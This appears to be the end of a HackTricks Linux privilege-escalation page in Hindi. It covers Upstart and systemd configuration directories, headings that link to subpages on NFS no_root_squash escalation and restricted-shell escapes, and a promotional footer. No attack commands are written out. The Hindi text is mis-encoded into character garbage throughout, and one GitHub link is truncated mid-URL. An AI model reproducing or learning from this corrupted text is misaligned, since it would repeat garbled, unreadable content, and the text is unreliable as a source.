рд╣реИред

`/etc/init` рдореЗрдВ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ **рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ** рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддреА рд╣реИрдВред рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ рдПрдХ рдпреБрд╡рд╛ **рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди рдкреИрдХреЗрдЬ** рд╣реИ рдЬрд┐рд╕реЗ рдпреВрдмрдВрдЯреВ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╢рдВрд╕рд╛ рдХреА рдЬрд╛рддреА рд╣реИред `/etc/init` рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ рдХреЛ рдмрддрд╛рддреА рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдФрд░ рдХрдм рд╕реЗрд╡рд╛ рдХреЛ `start`, `stop`, `reload` рдХрд░рдирд╛ рд╣реИ, рдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА `status` рдХрд╛ рдкреВрдЫрддрд╛рдЫ рдХрд░рдирд╛ рд╣реИред рд▓реНрдпреВрд╕рд┐рдб рдХреЗ рд░реВрдк рдореЗрдВ, рдпреВрдмрдВрдЯреВ рд╕рд┐рд╕рд╡реАрдЗрдирд┐рдЯ рд╕реЗ рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЬрд┐рд╕рд▓реЗ рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрд╕рдВрдж рдХреА рдЬрд╛рддреА рд╣реИрдВ рддреЛ рд╕рд┐рд╕рд╡реАрдЗрдирд┐рдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреА рд╕рд╛рде рдореЗрдВ рдЖрддреЗ рд╣реИрдВред рдпреВрдкрд╕реНрдЯрд╛рд░реНрдЯ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕рдВрдЧрддрддрд╛ рдкрд░рдд рдореЗрдВ рд╕рд┐рд╕рд╡реАрдЗрдирд┐рдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред (рдпрд╣рд╛рдВ рд╕реЗ [рдпрд╣рд╛рдВ](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))ред

**рд╕рд┐рд╕реНрдЯрдордб** рдПрдХ **рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд╛рд░рдВрднрдг рдкреНрд░рдгрд╛рд▓реА рдФрд░ рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрдХ** рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдСрди-рдбрд┐рдорд╛рдВрдб рдбреАрдордиреНрд╕ рдХреА рдкреНрд░рд╛рд░рдВрднрд┐рдХрдХрд░рдг, рдорд╛рдЙрдВрдЯ рдФрд░ рдСрдЯреЛрдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рд░рдЦрд░рдЦрд╛рд╡, рд╕реНрдиреИрдкрд╢реЙрдЯ рд╕рдорд░реНрдерди рдФрд░ рд▓рд┐рдирдХреНрд╕ рдХрдВрдЯреНрд░реЛрд▓ рд╕рдореВрд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдЯреНрд░реИрдХрд┐рдВрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╕рд┐рд╕реНрдЯрдордб рдПрдХ рд▓реЙрдЧрд┐рдВрдЧ рдбреАрдорди рдФрд░ рдЕрдиреНрдп рдЙрдкрдХрд░рдг рдФрд░ рдЙрдкрдпреЛрдЧрд┐рддрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдпреЛрдВ рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВред (рдпрд╣рд╛рдВ рд╕реЗ [рдпрд╣рд╛рдВ](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/))ред

рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд░реЗрдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдкреИрдХреЗрдЬ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ `/usr/lib/systemd/` рдореЗрдВ рдЬрд╛рддреА рд╣реИрдВред рдкреНрд░рдгрд╛рд▓рд┐рдХрд╛ рдкреНрд░рд╢рд╛рд╕рдХ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛) рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рд╕рдВрд╢реЛрдзрди `/etc/systemd/system/` рдореЗрдВ рдЬрд╛рддреЗ рд╣реИрдВред

## рдЕрдиреНрдп рддрд░рдХреАрдмреЗрдВ

### NFS рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### рд╕реАрдорд┐рдд рд╢реИрд▓реНрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### рд╕рд┐рд╕реНрдХреЛ - рд╡реАрдореИрдиреЗрдЬ

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## рдХрд░реНрдиреЗрд▓ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрд░рдХреНрд╖рдг

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p
* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**
